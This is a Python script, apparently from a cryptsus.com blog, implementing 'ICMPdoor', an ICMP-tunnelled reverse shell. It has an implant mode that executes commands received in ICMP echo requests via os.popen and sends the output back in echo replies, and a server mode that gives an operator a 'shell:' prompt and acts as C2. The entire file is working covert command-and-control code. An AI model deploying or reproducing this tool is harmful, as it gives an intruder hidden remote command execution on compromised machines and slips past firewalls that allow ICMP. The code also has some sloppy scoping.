#!/usr/bin/env python3

import argparse
import os
from multiprocessing import Process
from scapy.all import ICMP, IP, Raw, sniff, sr

"""
ICMPdoor (IMCP reverse shell) [implant]
By krabelize | cryptsus.com
More info: https://cryptsus.com/blog/icmp-reverse-shell.html
"""

class Icmpdoor():
    __slots__ = ('ICMP_ID', 'TTL', 'svr')
    def __init__(self, args):
        """Leave a spot for expansion"""
        self.ICMP_ID = 13170
        self.TTL = 64
        if args.mode == 'server':
            self.svr = self.serverShell()

    def LFILTER(self, type):
        """ICMP type filtering"""
        def snarf(pkt):
            if pkt[IP].src == args.destination_ip:
                if pkt[ICMP].type == type:
                    if pkt[ICMP].id == idr.ICMP_ID:
                        if pkt[Raw].load:
                            return True
        return snarf

    def clientShell(self):
        """prn in sniff()"""
        def snarf(pkt):
            icmppaket = (pkt[Raw].load).decode('utf-8', errors = 'ignore')
            payload = os.popen(icmppaket).readlines()
            icmppacket = (IP(dst = args.destination_ip, ttl = self.TTL)/\
                          ICMP(type = 0, id = idr.ICMP_ID)/\
                          Raw(load = payload))
            sr(icmppacket, timeout = 0, verbose = 0)
        return snarf

    def serverShell(self):
        """Show the output from the client"""
        def snarf(pkt):
            try:
                print(pkt[Raw].load.decode().replace('\n', ''))
            except:
                pass
        return snarf

    def svrSniff(self):
        """Sniff for the return output from the client"""
        if args.interface is None:
            sniff(prn = self.svr,
                  lfilter = idr.LFILTER,
                  filter = 'icmp',
                  store = 0)
        else:
            sniff(iface = args.interface,
                  prn = self.svr,
                  lfilter = idr.LFILTER,
                  filter = 'icmp',
                  store = 0)

if __name__ == '__main__':

    ## Env
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--destination_ip',
                        required = True,
                        help = 'Destination IP address')
    parser.add_argument('-i', '--interface',
                        help = '(Virtual) Network Interface (e.g. eth0)')
    parser.add_argument('-m', '--mode',
                        choices = ['server', 'client'],
                        help = 'server or client mode (client mode is default)')
    args = parser.parse_args()
    idr = Icmpdoor(args)

    ## Client mode
    if args.mode is None or args.mode == 'client':
        PRN = idr.clientShell()
        LFILTER = idr.LFILTER(8)
        print("[+]ICMP listener starting!")

        if args.interface is None:
            sniff(prn = PRN,
                  lfilter = LFILTER,
                  filter = 'icmp',
                  store = 0)
        else:
            sniff(iface = args.interface,
                  prn = PRN,
                  lfilter = LFILTER,
                  filter = 'icmp',
                  store = 0)

    ## Server mode
    else:
        sniffing = Process(target = idr.svrSniff)
        sniffing.start()
        LFILTER = idr.LFILTER(0)
        print("[+]ICMP C2 started!")
        while True:
            icmpshell = input("shell: ")
            if icmpshell == 'exit':
                print("[+]Stopping ICMP C2...")
                sniffing.terminate()
                break
            elif icmpshell == '':
                pass
            else:
                payload = (IP(dst = args.destination_ip, ttl = idr.TTL)/\
                           ICMP(type = 8, id = idr.ICMP_ID)/\
                           Raw(load = icmpshell))
                sr(payload, timeout = 0, verbose = 0)
        sniffing.join()
